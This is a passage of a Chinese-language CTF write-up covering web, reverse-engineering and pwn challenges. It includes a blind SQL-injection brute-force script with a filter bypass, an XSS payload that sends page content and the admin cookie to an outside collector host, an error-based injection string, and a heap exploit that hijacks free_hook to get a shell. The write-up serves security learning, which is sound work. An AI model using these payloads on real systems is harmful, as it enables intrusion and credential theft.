,on&#x7B49;&#xFF0C;&#x4E0D;&#x8FC7;&#x53EF;&#x4EE5;&#x53CC;&#x5199;&#x7ED5;&#x8FC7;&#xFF0C;&#x5176;&#x4E2D;on&#x662F;&#x6700;&#x5751;&#x7684;&#xFF0C;&#x8FD9;&#x662F;&#x6700;&#x5F00;&#x59CB;&#x6D4B;&#x8BD5;union&#x662F;&#x5426;&#x88AB;&#x8FC7;&#x6EE4;&#x53D1;&#x73B0;&#x7684;&#x3002;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CC;&#x5199;&#x5C31;&#x80FD;&#x7ED5;&#x8FC7;&#x4E86;&#x3002; &#x5176;&#x5B83;&#x4E5F;&#x5C31;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x8FC7;&#x6EE4;&#x4E86;&#x3002; &#x6700;&#x540E;&#x7206;&#x7834;&#x51FA;&#x6765;&#x7684;&#x8868;&#x540D;fff1ag&#xFF0C;&#x5217;&#x540D;thisi5f14g &#x7206;&#x7834;flag&#x7684;&#x811A;&#x672C;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre class="language-"><code>import requests
import string
import random
import time
import re
#fff1ag
#thisi5f14g
url=&apos;http://106.75.107.53:8888/&apos;
chars=string.printable[:62]+&quot;!@#$%^&amp;*()_+-={}&quot;
header = {
            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos;,
            &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
            &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;,
            &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,
            &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;,
            &apos;Connection&apos;: &apos;keep-alive&apos;
        }
def register(data):
    result = requests.post(url+&quot;register.php&quot;,data=data,headers=header)
    if &quot;Register success&quot; in result.content:
        return True
    else:
        return False
def check(data):
    data=data.replace(&apos;on&apos;,&apos;&apos;)
    #print data
    r=requests.session()
    content=r.post(url+&quot;login.php&quot;,data=data,headers=header).content
    #print content
    if &quot;wrong&quot; in content:
        raw_input(&quot;error!!!!!!!!!!!!!!!!!!!!!!&quot;);
    balance=int(re.findall(&apos;you balance is (.*?)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>&apos;,content)[0])
    #print &quot;balance1:&quot;+str(balance)
    r.get(url+&apos;buy.php?id=1&apos;)
    content=r.get(url+&apos;user.php&apos;).content
    balance2=int(re.findall(&apos;you balance is (.*?)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>&apos;,content)[0])
    #print &quot;balance2:&quot;+str(balance2)
    if balance-2333==balance2:
        return True
    else:
        return False
ans=&quot;&quot;
for i in xrange(1,100):
    for j in chars:
        username=str(time.time())+&quot;&apos; or ord(substr((selonect thisi5f14g froonm fff1ag),%d,1))=%s#&quot;%(i,ord(j))
        #print username
        password=&apos;123&apos;
        data=&apos;user=&apos;+username+&apos;&amp;pass=&apos;+password
        if register(data)==True:
            print i,j
            if check(data)==True:
                ans+=j
                print ans
                break
</code></pre><p>&#x622A;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;  </p>
<p>     <a href="http://p1.qhimg.com/t01b36aa50f9fe63411.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p1.qhimg.com/t01b36aa50f9fe63411.png" alt="">
     </a></p>
<h3 id="14guestbook"><a name="14guestbook" class="anchor-navigation-ex-anchor" href="#14guestbook"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.5. 14.Guestbook</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;WEB    &#x5206;&#x503C;&#xFF1A;400&#x5206;</p>
<p>&#x9996;&#x5148;&#x770B;csp&#xFF0C;</p>
<pre class="language-"><code>default-src &apos;self&apos;; 
script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;; 
font-src &apos;self&apos; fonts.gstatic.com; 
style-src &apos;self&apos; &apos;unsafe-inline&apos;; 
img-src &apos;self&apos;
</code></pre><p>&#x7136;&#x540E;&#x662F;&#x6C99;&#x76D2;&#xFF1A;</p>
<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><p>&#x53D1;&#x73B0;&#x6C99;&#x76D2;&#x548C;&#x4E4B;&#x524D;0ctf&#x4E00;&#x6837;&#xFF0C;csp&#x4E5F;&#x5141;&#x8BB8;&#x4E86;unsafe-eval&#x7684;&#x6267;&#x884C;</p>
<p>&#x7136;&#x540E;&#x5F00;&#x59CB;&#x6D4B;&#x8BD5;&#xFF0C;&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;link&#x6807;&#x7B7E;&#x554A;&#xFF0C;location&#x90FD;&#x88AB;&#x8FC7;&#x6EE4;&#x66FF;&#x6362;&#x6210;hacker&#x3002;</p>
<p>&#x4F46;&#x662F;location&#x5F88;&#x5BB9;&#x6613;&#x7ED5;&#x8FC7;&#x4F8B;&#x5982;<code>window[&apos;locat&apos;+&apos;ion&apos;].href</code></p>
<p>&#x6240;&#x4EE5;&#x601D;&#x8DEF;&#x548C;0ctf&#x4E00;&#x6837;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;iframe&#x4ECE;&#x5176;&#x4ED6;&#x8DEF;&#x5F84;&#x4E0B;&#x201C;&#x501F;&#x7528;&#x201D;&#x4E00;&#x4E2A;XMLHttpRequest&#xFF0C;&#x6765;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#xFF0C;&#x5927;&#x6982;&#x521D;&#x59CB;payload&#x5982;&#x4E0B;&#xFF1A;</p>
<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>bendawang<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>http://106.75.103.149:8888/<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; 
var xhr = new XMLHttpRequest();
xhr.open(&quot;GET&quot;, &quot;http://106.75.103.149:8888/index.php &quot;, false);
xhr.send();
a=xhr.responseText;
window[&apos;locat&apos;+&apos;ion&apos;].href=&apos;http://104.160.43.154:8000/xss/?content=&apos;+escape(a);
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><p>&#x80FD;&#x591F;&#x6210;&#x529F;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FD4;&#x56DE;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;cookie&#xFF0C;&#x6E90;&#x7801;&#x91CC;&#x9762;&#x4E5F;&#x6CA1;&#x6709;flag&#xFF0C;&#x901A;&#x8FC7;&#x6D4B;&#x8BD5;document.referrer&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#xFF1A;</p>
<p>     <a href="http://p0.qhimg.com/t01eda7957d3d063945.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p0.qhimg.com/t01eda7957d3d063945.png" alt="">
     </a></p>
<p>&#x9996;&#x5148;&#x770B;csp&#xFF0C;</p>
<pre class="language-"><code>default-src &apos;self&apos;; 
script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;; 
font-src &apos;self&apos; fonts.gstatic.com; 
style-src &apos;self&apos; &apos;unsafe-inline&apos;; 
img-src &apos;self&apos;
</code></pre><p>&#x6700;&#x540E;&#x4FEE;&#x6B63;payload&#x5982;&#x4E0B;&#xFF1A;</p>
<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>javascript:i=document.createElement(&apos;iframe&apos;);i.src=&apos;/admin/review.php?b=2e232e23&apos;;
i[&apos;onlo&apos;+&apos;ad&apos;]=function(){parent.window[&apos;locat&apos;+&apos;ion&apos;].href=&apos;http://xss/ 
&apos;+escape(this.contentWindow.document.cookie)};
document.body.append(i)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
</code></pre><h3 id="16&#x65B9;&#x821F;&#x8BA1;&#x5212;"><a name="16&#x65B9;&#x821F;&#x8BA1;&#x5212;" class="anchor-navigation-ex-anchor" href="#16&#x65B9;&#x821F;&#x8BA1;&#x5212;"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.6. 16.&#x65B9;&#x821F;&#x8BA1;&#x5212;</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;WEB   &#x5206;&#x503C;&#xFF1A;400&#x5206;</p>
<p>&#x9996;&#x5148;&#x626B;&#x63CF;&#x53D1;&#x73B0;&#x5728;&#x6CE8;&#x518C;&#x65F6;&#x624B;&#x673A;&#x90A3;&#x4E00;&#x680F;&#x5B58;&#x5728;&#x62A5;&#x9519;&#x6CE8;&#x5165;</p>
<pre class="language-"><code>username=&apos;ad121212122min&apos;&amp;phone=&apos; or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or&apos;&amp;password=&apos;admin&apos;=&apos;&apos;#&amp;repassword=&apos;admin&apos;=&apos;&apos;#
</code></pre><p>&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x8D26;&#x6237;&#x5BC6;&#x7801; &#x767B;&#x5F55;&#x8FDB;&#x53BB;&#x53D1;&#x73B0;&#x662F;ffpm&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6; </p>
<p>&#x7136;&#x540E;&#x8BFB;&#x53D6;etc/passwd &#x88AB;&#x8FC7;&#x6EE4;&#x4E86; &#x7A0D;&#x5FAE;&#x7ED5;&#x8FC7;&#x4E00;&#x4E0B;&#x5C31;&#x80FD;&#x8BFB;&#x4E86; &#x5F97;&#x5230;&#x7528;&#x6237;&#x540D;s0m3b0dy &#x5728;&#x5176;home&#x76EE;&#x5F55;&#x4E0B;&#x8BFB;&#x53D6;&#x5230;flag&#x6587;&#x4EF6;</p>
<h2 id="&#x4E8C;&#x3001;reverse"><a name="&#x4E8C;&#x3001;reverse" class="anchor-navigation-ex-anchor" href="#&#x4E8C;&#x3001;reverse"><i class="fa fa-link" aria-hidden="true"></i></a>5.2. &#x4E8C;&#x3001;REVERSE</h2>
<h3 id="2&#x586B;&#x6570;&#x6E38;&#x620F;"><a name="2&#x586B;&#x6570;&#x6E38;&#x620F;" class="anchor-navigation-ex-anchor" href="#2&#x586B;&#x6570;&#x6E38;&#x620F;"><i class="fa fa-link" aria-hidden="true"></i></a>5.2.1. 2.&#x586B;&#x6570;&#x6E38;&#x620F;</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;REVERSE    &#x5206;&#x503C;&#xFF1A;200&#x5206;</p>
<p>&#x9006;&#x5411;&#x4E00;&#x770B;&#x5C31;&#x662F;&#x4E2A;&#x6570;&#x72EC;&#x6E38;&#x620F;&#xFF0C;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x628A;&#x539F;&#x6765;&#x7684;9*9&#x627E;&#x51FA;&#x6765;</p>
<p>&#x91CC;&#x9762;&#x6709;&#x4E00;&#x5757;&#x521D;&#x59CB;&#x5316;&#x6570;&#x72EC;&#xFF0C;&#x90A3;&#x4E2A;&#x5730;&#x65B9;&#x770B;&#x51FA;&#x6765;&#x662F;</p>
<p>&#x4ED6;&#x7684;&#x6570;&#x72EC;&#x9898;&#x76EE;&#x5C31;&#x5982;&#x4E0B;&#x4E00;&#x6837;&#xFF0C;&#x7136;&#x540E;&#x627E;&#x4E2A;&#x7F51;&#x7AD9;&#x89E3;&#x4E00;&#x4E0B;&#xFF0C;</p>
<p>&#x7136;&#x540E;&#x8F93;&#x5165;&#x65F6;&#x5019;&#x628A;&#x5B58;&#x5728;&#x7684;&#x9879;&#x53D8;&#x6210;0&#x5C31;&#x884C;</p>
<p>     <a href="http://p4.qhimg.com/t01a3805198d684e239.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p4.qhimg.com/t01a3805198d684e239.png" alt="">
     </a></p>
<p>     <a href="http://p3.qhimg.com/t01832d8510e42c9ce3.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p3.qhimg.com/t01832d8510e42c9ce3.png" alt="">
     </a></p>
<h3 id="5apk-crack"><a name="5apk-crack" class="anchor-navigation-ex-anchor" href="#5apk-crack"><i class="fa fa-link" aria-hidden="true"></i></a>5.2.2. 5.apk crack</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;REVERSE    &#x5206;&#x503C;&#xFF1A;300&#x5206;</p>
<p>&#x672C;&#x9898;&#x7684;&#x505A;&#x6CD5;&#x6BD4;&#x8F83;&#x53D6;&#x5DE7;&#xFF0C;&#x9996;&#x5148;&#x4F7F;&#x7528;jeb2&#x6253;&#x5F00;apk&#x6587;&#x4EF6;&#xFF0C;&#x67E5;&#x770B;&#x9A8C;&#x8BC1;&#x7684;&#x5173;&#x952E;&#x6D41;&#x7A0B;</p>
<p>     <a href="http://p6.qhimg.com/t01df0c0de8d06b6f4e.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p6.qhimg.com/t01df0c0de8d06b6f4e.png" alt="">
     </a></p>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x7A0B;&#x5E8F;&#x5728;&#x53D6;&#x5F97;&#x4E86;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x540E;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;wick.show&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x4F1A;&#x8C03;&#x7528;jni&#x4E2D;&#x7684;&#x5BF9;&#x5E94;&#x51FD;&#x6570;&#xFF0C;&#x8BE5;jni&#x51FD;&#x6570;&#x4F1A;&#x5F00;&#x542F;&#x53CD;&#x8C03;&#x8BD5;&#x5E76;&#x7ED9;&#x9759;&#x6001;&#x53D8;&#x91CF;A&#x3001;B&#x8D4B;&#x503C;success&#x548C;failed&#x3002;&#x968F;&#x540E;&#x4F1A;&#x8FDB;&#x5165;simple.check&#x65B9;&#x6CD5;&#x5F00;&#x542F;&#x9A8C;&#x8BC1;&#x3002;</p>
<p>&#x8FD9;&#x4E2A;&#x9A8C;&#x8BC1;&#x51FD;&#x6570;&#x975E;&#x5E38;&#x957F;&#xFF0C;&#x7B14;&#x8005;&#x4E5F;&#x6CA1;&#x770B;&#x61C2;&#x3002;Simple&#x7C7B;&#x4E2D;&#x6709;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x8F93;&#x5165;&#xFF0C;&#x628A;&#x5B83;&#x547D;&#x540D;&#x4E3A;input&#xFF1B;&#x53E6;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x521D;&#x59CB;&#x4E3A;&#x7A7A;&#xFF0C;&#x628A;&#x5B83;&#x547D;&#x540D;&#x4E3A;empty&#x3002;</p>
<p>&#x4F7F;&#x7528;jeb2&#x7684;&#x52A8;&#x6001;&#x8C03;&#x8BD5;&#x529F;&#x80FD;&#xFF0C;&#x628A;&#x65AD;&#x70B9;&#x4E0B;&#x5230;00000A7A&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x6307;&#x4EE4;&#x5904;&#xFF0C;&#x5728;&#x624B;&#x673A;&#x4E2D;&#x8F93;&#x5165;&#x968F;&#x610F;&#x5B57;&#x7B26;&#x5E76;&#x70B9;&#x51FB;&#x786E;&#x5B9A;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x65AD;&#x5728;&#x8FD4;&#x56DE;&#x6307;&#x4EE4;&#x5904;&#x3002;</p>
<p>      <a href="http://p3.qhimg.com/t01639ea2aa519fae9b.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p3.qhimg.com/t01639ea2aa519fae9b.png" alt="">
     </a></p>
<p>&#x6B64;&#x65F6;&#x67E5;&#x770B;empty&#x6570;&#x7EC4;&#x7684;&#x503C;&#xFF0C;&#x53D1;&#x73B0;&#x7591;&#x4F3C;ASCII&#x7801;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x8F6C;&#x6362;&#x8FC7;&#x6765;&#x5C31;&#x662F;flag</p>
<p>      <a href="http://p2.qhimg.com/t0164b7ced05b10e869.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p2.qhimg.com/t0164b7ced05b10e869.png" alt="">
     </a></p>
<p>flag&#xFF1A;clo5er</p>
<h3 id="17&#x6EAF;&#x6E90;"><a name="17&#x6EAF;&#x6E90;" class="anchor-navigation-ex-anchor" href="#17&#x6EAF;&#x6E90;"><i class="fa fa-link" aria-hidden="true"></i></a>5.2.3. 17.&#x6EAF;&#x6E90;</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;REVERSE   &#x5206;&#x503C;&#xFF1A;200&#x5206;</p>
<p>&#x9996;&#x5148;&#x662F;&#x8F93;&#x5165;&#x957F;&#x5EA6;&#x4E3A;200&#x5B57;&#x8282;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#x8F6C;&#x5316;&#x4E3A;1&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5F97;&#x5230;100&#x5B57;&#x8282;&#x7684;&#x8F93;&#x51FA;&#x3002;</p>
<p>&#x6839;&#x636E;&#x540E;&#x9762;&#x7684;&#x6BD4;&#x8F83;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x8FD9;100&#x5B57;&#x8282;&#x5206;&#x522B;&#x4E3A;0-99&#x8FD9;100&#x4E2A;&#x6570;&#x3002;&#x540E;&#x9762;&#x6309;&#x7167;&#x7279;&#x5B9A;&#x7684;&#x987A;&#x5E8F;&#x5C06;0&#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#x548C;&#x5176;&#x4E0A;&#x4E0B;&#x5DE6;&#x53F3;&#x7684;&#x67D0;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x8FDB;&#x884C;&#x4EA4;&#x6362;&#x3002;&#x9A8C;&#x8BC1;&#x7ECF;&#x8FC7;&#x4EA4;&#x6362;&#x540E;&#x7684;&#x6570;&#x636E;&#x521A;&#x597D;&#x662F;0-99&#x987A;&#x5E8F;&#x6392;&#x5217;&#x3002;</p>
<p>&#x5927;&#x4F53;&#x601D;&#x8DEF;&#x662F;&#x6784;&#x9020;&#x8F93;&#x5165;&#x4E3A;0-99&#xFF0C;&#x5F97;&#x5230;&#x4EA4;&#x6362;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4EA4;&#x6362;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF0C;&#x7136;&#x540E;&#x53CD;&#x8FC7;&#x6765;&#x6839;&#x636E;&#x8F93;&#x51FA;&#x4E3A;0-100&#xFF0C;&#x6C42;&#x8F93;&#x5165;&#x3002;</p>
<pre class="language-"><code>data = &apos;&apos;
for i in range(100):
    high = i/0x10
    low = i%0x10
    data += chr(65+high) + chr(65+low)
print data
#output of 0-99
f = open(&apos;./result&apos;, &apos;rb&apos;)
d = f.read()
f.close()
from zio import *
dict = {}
for i in range(100):
    value = l32(d[i*4:i*4+4])
    if value &gt; 100:
        print hex(value)
    dict[value] = i
data = &apos;&apos;
for i in range(100):
    high = dict[i]/0x10
    low = dict[i]%0x10
    data += chr(65+high) + chr(65+low)
print data
</code></pre><h2 id="&#x4E09;&#x3001;pwn"><a name="&#x4E09;&#x3001;pwn" class="anchor-navigation-ex-anchor" href="#&#x4E09;&#x3001;pwn"><i class="fa fa-link" aria-hidden="true"></i></a>5.3. &#x4E09;&#x3001;PWN</h2>
<h3 id="3easyheap"><a name="3easyheap" class="anchor-navigation-ex-anchor" href="#3easyheap"><i class="fa fa-link" aria-hidden="true"></i></a>5.3.1. 3.easyheap</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;PWN    &#x5206;&#x503C;&#xFF1A;200&#x5206;</p>
<p>&#x5728;edit&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x56E0;&#x4E3A;&#x5806;&#x4E2D;&#x6709;&#x6307;&#x9488;&#xFF0C;&#x56E0;&#x6B64;&#x53EA;&#x8981;&#x8986;&#x76D6;&#x6307;&#x9488;&#x5373;&#x53EF;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#x3002;
&#x56E0;&#x4E3A;&#x5F00;&#x542F;&#x4E86;PIE&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8986;&#x76D6;&#x6307;&#x9488;&#x7684;&#x6700;&#x4F4E;&#x5B57;&#x8282;&#x8FDB;&#x884C;&#x6CC4;&#x9732;&#x3002;</p>
<pre class="language-"><code>from threading import Thread
from zio import *
target = &apos;./easyheap&apos;
target = (&apos;120.132.66.76&apos;, 20010)
def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return
    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != &apos;&apos;:
            io.writeline(d)
def create_note(io, size, content):
    io.read_until(&apos;Choice:&apos;)
    io.writeline(&apos;1&apos;)
    io.read_until(&apos;:&apos;)
    io.writeline(str(size))
    io.read_until(&apos;:&apos;)
    io.writeline(content)
def edit_note(io, id, size, content):
    io.read_until(&apos;Choice:&apos;)
    io.writeline(&apos;2&apos;)
    io.read_until(&apos;:&apos;)
    io.writeline(str(id))
    io.read_until(&apos;:&apos;)
    io.writeline(str(size))
    io.read_until(&apos;:&apos;)
    io.write(content)
def list_note(io):
    io.read_until(&apos;Choice:&apos;)
    io.writeline(&apos;3&apos;)
def remove_note(io, id):
    io.read_until(&apos;Choice:&apos;)
    io.writeline(&apos;4&apos;)
    io.read_until(&apos;:&apos;)
    io.writeline(str(id))
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), 
             print_write=COLORED(RAW, &apos;green&apos;))
    create_note(io, 0xa0, &apos;/bin/shx00&apos;.ljust(0x90, &apos;a&apos;)) #0
    create_note(io, 0xa0, &apos;b&apos;*0x90) #1
    create_note(io, 0xa0, &apos;c&apos;*0x90) #2
    create_note(io, 0xa0, &apos;/bin/shx00&apos;.ljust(0x90, &apos;a&apos;)) #3
    remove_note(io, 2)
    edit_note(io, 0, 0xb9, &apos;a&apos;*0xb0+l64(0xa0)+&apos;xd0&apos;)
    list_note(io)
    io.read_until(&apos;id:1,size:160,content:&apos;)
    leak_value = l64(io.readline()[:-1].ljust(8, &apos;x00&apos;))
    base = leak_value - 0x3c4b78
    system = base + 0x0000000000045390
    free_hook = base + 0x00000000003C67A8
    edit_note(io, 0, 0xc0, &apos;a&apos;*0xb0+l64(0xa0)+l64(free_hook))
    edit_note(io, 1, 8, l64(system))
    print hex(system)
    print hex(free_hook)
    remove_note(io, 3)
    interact(io)
exp(target)
</code></pre><h3 id="9babydriver"><a name="9babydriver" class="anchor-navigation-ex-anchor" href="#9babydriver"><i class="fa fa-link" aria-hidden="true"></i></a>5.3.2. 9.BabyDriver</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;pwn    &#x5206;&#x503C;&#xFF1A;450&#x5206;
0x00 &#x524D;&#x8A00;</p>
<p>&#x9996;&#x5148;&#x9898;&#x76EE;&#x7ED9;&#x4E86;&#x4E00;&#x5957;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#xFF0C;&#x5229;&#x7528;qemu&#x542F;&#x52A8;&#xFF0C;nc&#x8FDE;&#x63A5;&#x6BD4;&#x8D5B;&#x73AF;&#x5883;&#x540E;&#x4F1A;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x4F4E;&#x6743;&#x9650;&#x7684;shell&#xFF0C;&#x540C;&#x65F6;&#x9898;&#x76EE;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;babyDriver.ko&#xFF0C;&#x901A;&#x8FC7;insmod&#x5C06;&#x9A71;&#x52A8;&#x52A0;&#x8F7D;&#x8FDB;&#x7CFB;&#x7EDF;&#xFF0C;&#x5148;&#x8FDB;&#x884C;&#x73AF;&#x5883;&#x642D;&#x5EFA;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x7684;&#x662F;qemu&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x7ED9;&#x7684;boot.sh&#x53EF;&#x4EE5;&#x5F97;&#x5230;qemu&#x7684;&#x542F;&#x52A8;&#x547D;&#x4EE4;&#x3002;</p>
<p>qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x63D0;&#x7684;&#x4E00;&#x70B9;&#x662F;&#x5F88;&#x591A;&#x4EBA;&#x90FD;&#x662F;&#x865A;&#x62DF;&#x673A;&#x91CC;&#x7684;Linux&#x5B89;&#x88C5;&#x7684;qemu&#xFF0C;&#x8FD9;&#x91CC;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x62A5;&#x4E00;&#x4E2A;KVM&#x7684;&#x9519;&#x8BEF;&#xFF0C;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x5F00;&#x542F;&#x865A;&#x62DF;&#x673A;/&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x865A;&#x62DF;&#x5316;&#x529F;&#x80FD;&#x3002;</p>
<p><a href="http://p0.qhimg.com/t01b4e7c9581908c7d5.png" target="_blank">http://p0.qhimg.com/t01b4e7c9581908c7d5.png</a></p>
<p>&#x542F;&#x52A8;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x8C03;&#x8BD5;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;qemu&#x542F;&#x52A8;&#x811A;&#x672C;&#x91CC;&#x52A0;&#x4E00;&#x6761;&#x53C2;&#x6570;-gdb tcp::1234 -S&#xFF0C;&#x8FD9;&#x6837;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x6302;&#x8D77;&#x7B49;&#x5F85;gdb&#x8FDE;&#x63A5;&#xFF0C;&#x8FDB;&#x5165;gdb&#xFF0C;&#x901A;&#x8FC7;&#x547D;&#x4EE4;</p>
<p>Target remote localhost:1234
Continue
&#x5C31;&#x53EF;&#x4EE5;&#x8FDC;&#x7A0B;&#x8C03;&#x8BD5;babyDriver.ko&#x4E86;&#x3002;</p>
<p>0x01 &#x6F0F;&#x6D1E;&#x5206;&#x6790;</p>
<p>&#x901A;&#x8FC7;IDA&#x6253;&#x5F00;babyDriver.ko&#xFF0C;&#x8FD9;&#x4E2A;&#x9A71;&#x52A8;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x5B9E;&#x73B0;&#x7684;&#x90FD;&#x662F;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x529F;&#x80FD;</p>
<p>     <a href="http://p7.qhimg.com/t01a50763d55f5653e3.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p7.qhimg.com/t01a50763d55f5653e3.png" alt="">
     </a></p>
